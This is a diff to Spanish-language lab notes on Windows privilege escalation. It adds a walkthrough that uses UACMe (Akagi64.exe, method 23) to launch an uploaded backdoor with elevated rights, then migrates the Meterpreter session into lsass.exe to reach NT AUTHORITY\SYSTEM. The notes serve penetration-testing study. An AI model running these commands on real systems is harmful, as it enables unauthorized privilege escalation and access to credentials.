@@ -2,6 +2,8 @@
 Status: #idea
 Tags: [[Windows Privilege Escalation]]
 
+- [[#Uso de UACMe|Uso de UACMe]]
+
 # Bypassing UAC (UACMe)
 
 UAC es una herramienta de Windows que permite solicitar permisos del administrador para realizar ciertas acciones.
@@ -45,6 +47,25 @@ Si no existe el directorio Temp, tendremos que navegar a C: y crearlo, y posteri
 upload backdoor.exe
 upload Akagi64.exe
 ```
+
+Para este lab, usaremos la key 23, pero esto, si miras la documentación, verás que puede variar dependiendo de lo que queramos hacer.
+
+```shell
+.\Akagi64.exe 23 C:\Temp\backdoor.exe
+```
+
+Esto conseguirá que se ejecute nuestro backdoor.exe con privilegios elevados, consiguiendo así una sesión de meterpreter con permisos elevados.
+
+Si hacemos ahora **getprivs**, veremos como tenemos más privilegios que antes.
+
+Esto nos permitirá migrar a cualquier otro proceso, por ejemplo, **lsass.exe** que tenga permisos de NT AUTHORITY\SYSTEM con el comando migrate especificando el PID (Process ID):
+
+```shell
+ps
+migrate 688
+```
+
+Si ahora volvemos a hacer **getuid**, veremos como somos NT AUTHORITY\SYSTEM.
 
 ---
 # Backlinks
